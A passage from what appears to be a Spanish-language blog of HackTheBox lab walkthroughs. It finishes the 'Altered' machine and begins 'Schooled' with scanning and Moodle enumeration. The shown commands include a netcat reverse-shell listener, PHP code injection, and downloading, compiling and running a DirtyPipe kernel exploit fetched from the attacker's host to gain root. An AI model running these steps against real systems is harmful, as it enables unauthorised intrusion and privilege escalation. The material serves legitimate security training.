  <li>Si comprobamos vemos que es correcto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/29.png" />
</p>

<ul>
  <li>Podemos probar escribiendo <code class="language-plaintext highlighter-rouge">test</code> en un archivo.txt en la ruta que sabemos que existe.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/30.png" />
</p>

<ul>
  <li>Pero si vamos a la web lo vemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/31.png" />
</p>

<ul>
  <li>Como interpreta PHP vamos a inyectar código PHP.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/32.png" />
</p>

<ul>
  <li>Funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/33.png" />
</p>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/34.png" />
</p>

<ul>
  <li>Vamos a ponernos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/35.png" />
</p>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.159] 55000
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>931<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@altered:/srv/altered/public<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@altered:/srv/altered/public<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@altered:/srv/altered/public<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
                                                                                                                
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
ENTER
www-data@altered:/srv/altered/public<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>La versión de <code class="language-plaintext highlighter-rouge">kernel</code> es vulnerable <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux altered 5.16.0-051600-generic <span class="c">#202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
www-data@altered:/<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.4 LTS
Release:	20.04
Codename:	focal
www-data@altered:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Nos descargamos el exploit.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/refs/heads/main/exploit-1.c
</code></pre></div></div>

<ul>
  <li>Ahora compilamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gcc exploit-1.c <span class="nt">-o</span> exploit2 <span class="nt">-static</span>
</code></pre></div></div>

<ul>
  <li>Lo pasamos a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>wget http://10.10.14.24/exploit2
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>./exploit2 
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to <span class="s2">"piped"</span>...
system<span class="o">()</span> <span class="k">function </span>call seems to have failed :<span class="o">(</span>
www-data@altered:/dev/shm<span class="nv">$ </span>./exploit2 
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to <span class="s2">"piped"</span>...
system<span class="o">()</span> <span class="k">function </span>call seems to have failed :<span class="o">(</span>
</code></pre></div></div>

<ul>
  <li>Ahora tenemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>su -
<span class="nt">---</span> Welcome to PAM-Wordle! <span class="nt">---</span>

A five character <span class="o">[</span>a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
<span class="k">*</span> - what letters are <span class="k">in </span>the wrong spot.
<span class="o">[</span>a-z] - what letters are correct.

<span class="nt">---</span> Attempt 1 of 6 <span class="nt">---</span>
Word: <span class="nb">chmod
</span>Hint-&gt;??<span class="k">*</span>??
<span class="nt">---</span> Attempt 2 of 6 <span class="nt">---</span>
Word: <span class="nb">mkdir
</span>Hint-&gt;<span class="k">*</span>??<span class="k">*</span>?
<span class="nt">---</span> Attempt 3 of 6 <span class="nt">---</span>
Word: shell
Hint-&gt;??<span class="k">*</span>??
<span class="nt">---</span> Attempt 4 of 6 <span class="nt">---</span>
Word: email
Invalid guess: unknown word.
Word: cmake
Hint-&gt;?<span class="k">*</span>??e
<span class="nt">---</span> Attempt 5 of 6 <span class="nt">---</span>
Word: <span class="nb">uname
</span>Hint-&gt;u??me
<span class="nt">---</span> Attempt 6 of 6 <span class="nt">---</span>
Word: utime
Correct!
Password:
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
507f83d162ba9b570e5397694741787d
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Schooled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled.html" rel="alternate" type="text/html" title="HackTheBox - Schooled (medium)" /><published>2024-10-11T00:00:00-06:00</published><updated>2024-10-11T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png" />
</p>

<ul>
  <li>Schooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained together in order to gain access as a <code class="language-plaintext highlighter-rouge">teacher</code> user, escalate privileges to a <code class="language-plaintext highlighter-rouge">manager</code> user and install a malicious plugin resulting in remote command execution. Cracking a hash obtained from the Moodle database allows SSH access to the system via password reuse. Privileges can then be escalated to <code class="language-plaintext highlighter-rouge">root</code> by installing a malicious package (which is possible due to <code class="language-plaintext highlighter-rouge">sudo</code> permissions and write access to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file).</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,33060 10.10.10.234 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-10 17:14 CST
Nmap scan report <span class="k">for </span>10.10.10.234
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"</span>
|     HY000
|   oracle-tns: 
|     Invalid message-frame.<span class="s2">"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=10/10%Time=67085FCF%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\</span>
SF:x0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HT
SF:TPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNS
SF:VersionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestT
SF:CP,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCo
SF:okie,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>
SF:0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>0
SF:5HY000<span class="s2">")%r(FourOhFourRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDStr
SF:ing,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0
SF:b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
SF:x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>
SF:20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r
SF:(LANDesk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\</span>
SF:0<span class="se">\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(Not
SF:esRPC,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Inv
SF:alid<span class="se">\x</span>20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>
SF:05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01
SF:<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos a comenzar enumerando el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.234</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.234</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">46</span><span class="p">],</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="c1">#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/1.png" />
</p>

<ul>
  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos algo interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-u</span> http://10.10.10.234
                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.234
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
301      GET        7l       20w      235c http://10.10.10.234/images <span class="o">=&gt;</span> http://10.10.10.234/images/
301      GET        7l       20w      232c http://10.10.10.234/css <span class="o">=&gt;</span> http://10.10.10.234/css/
301      GET        7l       20w      231c http://10.10.10.234/js <span class="o">=&gt;</span> http://10.10.10.234/js/
200      GET       21l      138w     5935c http://10.10.10.234/images/logo_05.png
200      GET       19l      100w     5832c http://10.10.10.234/images/logo_06.png
200      GET      364l      668w     6108c http://10.10.10.234/css/responsive.css
200      GET        3l       29w    16814c http://10.10.10.234/images/favicon.ico
200      GET       24l      137w     7123c http://10.10.10.234/images/logo_03.png
200      GET       26l       53w      437c http://10.10.10.234/js/01-custom-places-example.js
200      GET       42l      306w    23349c http://10.10.10.234/images/testi_03.png
200      GET        8l      246w     8395c http://10.10.10.234/js/timeline.min.js
200      GET        4l      194w     8215c http://10.10.10.234/js/modernizer.js
200      GET       15l      114w     5619c http://10.10.10.234/images/logo_01.png
200      GET       22l      108w     5099c http://10.10.10.234/images/logo_02.png
200      GET       24l      123w     7771c http://10.10.10.234/images/logo_04.png
200      GET       36l      161w    12089c http://10.10.10.234/images/apple-touch-icon.png
200      GET       58l      283w    21484c http://10.10.10.234/images/testi_02.png
200      GET      461l     1555w    20750c http://10.10.10.234/index.html
200      GET      364l     1095w    15997c http://10.10.10.234/teachers.html
200      GET      357l     1352w    17784c http://10.10.10.234/about.html
200      GET     1911l     7282w    57523c http://10.10.10.234/js/mapsed.js
200      GET       11l      485w    52789c http://10.10.10.234/css/animate.min.css
200      GET      338l     1778w   109546c http://10.10.10.234/images/parallax_04.jpg
200      GET      509l     2620w   170217c http://10.10.10.234/images/slider-01.jpg
200      GET       84l      358w    14211c http://10.10.10.234/images/img-01.jpg
200      GET       35l      179w     5340c http://10.10.10.234/images/ajax-loader.gif
200      GET       23l      147w    12279c http://10.10.10.234/images/avatar-02.jpg
200      GET       10l       49w      575c http://10.10.10.234/images/arrow-left.svg
200      GET       10l       49w      575c http://10.10.10.234/images/arrow-right.svg
200      GET       30l      173w    11994c http://10.10.10.234/images/avatar-03.jpg
200      GET       40l      180w    13328c http://10.10.10.234/images/author.jpg
200      GET       23l      168w    11422c http://10.10.10.234/images/avatar-01.jpg
200      GET        5l       50w     1366c http://10.10.10.234/images/search-icon.png
200      GET       79l      287w    18516c http://10.10.10.234/images/img-03.jpg
200      GET      104l      538w    21523c http://10.10.10.234/images/img-04.jpg
200      GET       77l      348w    19095c http://10.10.10.234/images/img-02.jpg
200      GET       60l      465w    39366c http://10.10.10.234/images/world-map.png
200      GET       94l      573w    44104c http://10.10.10.234/images/blog_2.jpg
200      GET       69l      405w    29844c http://10.10.10.234/images/blog_1.jpg
200      GET       82l      369w    33799c http://10.10.10.234/images/about_03.jpg
200      GET       89l      535w    40621c http://10.10.10.234/images/blog_5.jpg
200      GET      144l      739w    44395c http://10.10.10.234/images/team-02.png
200      GET      156l      932w    54249c http://10.10.10.234/images/team-04.png
301      GET        7l       20w      234c http://10.10.10.234/fonts <span class="o">=&gt;</span> http://10.10.10.234/fonts/
200      GET      212l     1045w    61692c http://10.10.10.234/images/team-01.png
200      GET      115l      651w    59462c http://10.10.10.234/images/blog_6.jpg
200      GET      538l     1359w    64664c http://10.10.10.234/images/banner.jpg
200      GET      120l      846w    59608c http://10.10.10.234/images/about_02.jpg
200      GET      114l      638w    56719c http://10.10.10.234/images/blog_3.jpg
200      GET      110l      835w    63659c http://10.10.10.234/images/blog_4.jpg
200      GET      200l     1040w    86799c http://10.10.10.234/images/blog_single.jpg
200      GET        7l       48w     2558c http://10.10.10.234/images/prettyPhoto/light_rounded/btnPrevious.png
200      GET        7l       54w     2072c http://10.10.10.234/images/prettyPhoto/default/default_thumb.png
200      GET        5l       78w     5660c http://10.10.10.234/fonts/Flaticon.woff
200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/light_rounded/default_thumbnail.gif
200      GET       69l      357w     5822c http://10.10.10.234/fonts/Flaticon.eot
200      GET       69l      354w     5637c http://10.10.10.234/fonts/Flaticon.ttf
200      GET       29l      179w     3935c http://10.10.10.234/images/prettyPhoto/dark_square/loader.gif
200      GET       16l       92w     6221c http://10.10.10.234/images/prettyPhoto/light_square/sprite.png
200      GET        7l       48w     2558c http://10.10.10.234/images/prettyPhoto/light_square/btnPrevious.png
200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/light_square/default_thumbnail.gif
200      GET       29l      179w     3935c http://10.10.10.234/images/prettyPhoto/dark_rounded/loader.gif
200      GET        4l       44w     1230c http://10.10.10.234/images/prettyPhoto/default/sprite_y.png
200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/dark_square/default_thumbnail.gif
200      GET       18l      102w     7258c http://10.10.10.234/images/prettyPhoto/light_rounded/sprite.png
200      GET       12l       37w     2531c http://10.10.10.234/images/prettyPhoto/light_square/btnNext.png
200      GET       29l      179w     3989c http://10.10.10.234/images/prettyPhoto/light_rounded/loader.gif
200      GET       29l      179w     3989c http://10.10.10.234/images/prettyPhoto/light_square/loader.gif
200      GET       12l       37w     2531c http://10.10.10.234/images/prettyPhoto/light_rounded/btnNext.png
200      GET       16l       92w     6221c http://10.10.10.234/images/prettyPhoto/dark_square/sprite.png
200      GET        3l        8w      181c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternTop.png
200      GET        3l        9w      182c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternBottom.png
200      GET       18l       95w     7558c http://10.10.10.234/images/prettyPhoto/facebook/sprite.png
200      GET        7l       25w     1489c http://10.10.10.234/images/prettyPhoto/facebook/btnNext.png
200      GET        7l       25w     1418c http://10.10.10.234/images/prettyPhoto/facebook/btnPrevious.png
200      GET      138l     2312w    23972c http://10.10.10.234/fonts/Flaticon.svg
200      GET        3l        8w      181c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternLeft.png
200      GET        3l        9w      184c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternRight.png
</code></pre></div></div>

<h2 id="moodle">Moodle</h2>

<ul>
  <li>
    <p>No vemos nada algo que podemos hacer es buscar si hay subdominios.</p>
  </li>
  <li>
    <p>Encontramos <code class="language-plaintext highlighter-rouge">moodle</code> <a href="https://www.maximaformacion.es/blog-teleformacion/que-es-la-plataforma-moodle-y-para-que-sirve-2/">https://www.maximaformacion.es/blog-teleformacion/que-es-la-plataforma-moodle-y-para-que-sirve-2/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>20750 <span class="nt">-u</span> http://10.10.10.234 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.schooled.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.10.234/
Total requests: 19966

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                        
<span class="o">=====================================================================</span>

000000162:   200        1 L      5 W        84 Ch       <span class="s2">"moodle"</span>                  
</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.234 moodle.schooled.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.234 moodle.schooled.htb
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/2.png" />
</p>

<ul>
  <li>Si queremos hacer algo en el <code class="language-plaintext highlighter-rouge">Moodle</code> nos pide iniciar sesión.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/3.png" />
</p>

<ul>
  <li>
    <p>Si buscamos como enumerar un <code class="language-plaintext highlighter-rouge">Moodle</code> encontramos el siguiente recurso <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle</a>.</p>
  </li>
  <li>
    <p>Vemos que solo encontramos la siguiente información <a href="https://github.com/SamJoan/droopescan">https://github.com/SamJoan/droopescan</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./droopescan scan moodle <span class="nt">-u</span> http://moodle.schooled.htb/moodle
<span class="o">[</span>+] Plugins found:                                                              
    forum http://moodle.schooled.htb/moodle/mod/forum/
        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
        http://moodle.schooled.htb/moodle/mod/forum/version.php

<span class="o">[</span>+] No themes found.

<span class="o">[</span>+] Possible version<span class="o">(</span>s<span class="o">)</span>:
    3.10.0-beta

<span class="o">[</span>+] Possible interesting urls found:
    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
    Admin panel - http://moodle.schooled.htb/moodle/login/

<span class="o">[</span>+] Scan finished <span class="o">(</span>0:00:08.210147 elapsed<span class="o">)</span>

</code></pre></div></div>

<ul>
  <li>Para poder enumerar mas a fondo vamos a registrarnos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/4.png" />
</p>

<ul>
  <li>Vemos que nos da un error y nos dice que solo acepta correos de ese dominio.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/5.png" />
</p>

<ul>
  <li>Una vez creada la cuenta vemos lo siguiente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/6.png" />
</p>

<ul>
  <li>Si nos inscribimos a un curso encontramos muchos participantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/7.png" />
</p>

<ul>
  <li>Si vamos a los <strong>Reminders</strong> vemos que Manuel Philips nos deja esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/8.png" />
</p>

<ul>
